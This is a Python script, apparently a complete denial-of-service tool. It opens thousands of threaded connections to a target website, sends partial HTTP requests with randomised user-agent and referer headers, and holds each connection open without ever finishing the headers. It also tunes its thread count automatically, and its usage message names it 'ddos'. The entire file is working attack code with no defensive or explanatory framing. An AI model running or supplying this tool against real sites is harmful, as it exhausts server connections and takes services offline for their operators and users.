__author__ = 'nogaems'
from threading import *
from socket import *
import sys
from time import *
import os
from random import *
from math import ceil

os.system('ulimit -n 4096')
stack_size(64*1024)

site = ''
port = 80

threads = 2000

succ_count = 0
err_count = 0

start_time = 0
end_time = 0

headers_referers = []
for line in open('referers', 'r'):
    headers_referers.append(line.rstrip())

headers_useragents = []
for line in open('useragents', 'r'):
    headers_useragents.append(line.rstrip())

def connection(ip, port, site):
    """
Creating connection

    """
    global err_count, succ_count
    sock = socket()
    try:
        sock.connect((ip, port))
    except:
        sys.stderr.write('\n    connection error to {0}:{1}'.format(ip, port))
        err_count += 1
        exit(1)
    headers = {'Host': site,
               'Connection': 'keep-alive',
               'User-Agent': choice(headers_useragents),
               'Referer': choice(headers_referers),
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Accept-Encoding': 'deflate,sdch',
               'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
               'Accept-Charset': 'windows-1251,utf-8;q=0.7,*;q=0.3'}
    sock.send('GET / HTTP/1.1\r\n')
    succ_count += 1
    for key in headers.keys():
        sock.send(key + ':' + headers[key] + '\r\n')
    #sock.send('\r\n') #ending of headers
    sleep(30)
    sock.close()

def go(site, port, threads):
    """
Starting


    """
    global start_time, end_time
    try:
        ip = gethostbyname(site)
    except:
        sys.stderr.write('\n    failed to get ip addres of {0}'.format(site))
        os.abort()
    start_time = time()
    try:
        while 1:
            if active_count() < threads:
                thread = Thread(target=connection, args=(ip, port, site)).start()
                sys.stdout.write('\rthread has been created, ' + str(active_count()) + ' threads currently are being running ')
                sleep(0.01)
                continue
            if succ_count > 100:
                if err_count != 0 and (succ_count  / err_count) < 10:
                    if threads != 0:
                        threads = int(ceil(threads - 1))
                        sys.stdout.write('\rMaximum number of threads is reduced to ' + str(threads))
                if err_count == 0 or (succ_count  / err_count) > 10:
                    if threads  <= 4090:
                        threads = int(ceil(threads + 1))
                    else:
                        threads = 4092
            sleep(0.5)
            sys.stdout.write('\r' + str(active_count()) + ' threads currently are being running ' +  (' ' * 20))
    except:
        end_time = time()
        print('\nExit!')
        print('{0} successful queries, {1} failed queries, time of work is {2} minutes'.format(succ_count, err_count,
                                                                                               (end_time - start_time)/60))
        os.abort()

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('Use format like: ddos exsample.com 80 1000, \n    exsample.com - target site,\
              \n    80 - port number,\n    1000 - number of threads')
        exit(0)
    try:
        gethostbyname(sys.argv[1])
    except:
        print('Enter the correct website address')
        exit(0)
    else:
        site = sys.argv[1]
    try:
        param = int(sys.argv[2])
    except:
        print('Enter the correct port number')
        exit(0)
    if param <= 0 or param >= 65536:
        print('Enter the correct port number')
        exit(0)
    port = int(sys.argv[2])
    try:
        param = int(sys.argv[3])
    except:
        print('Enter the correct number of threads (from 1 to 4092)')
        exit(0)
    if param <= 0 or param >= 4092:
        print('Enter the correct number of threads (from 1 to 4092)')
        exit(0)
    threads = int(sys.argv[3])
    go(site, port, threads)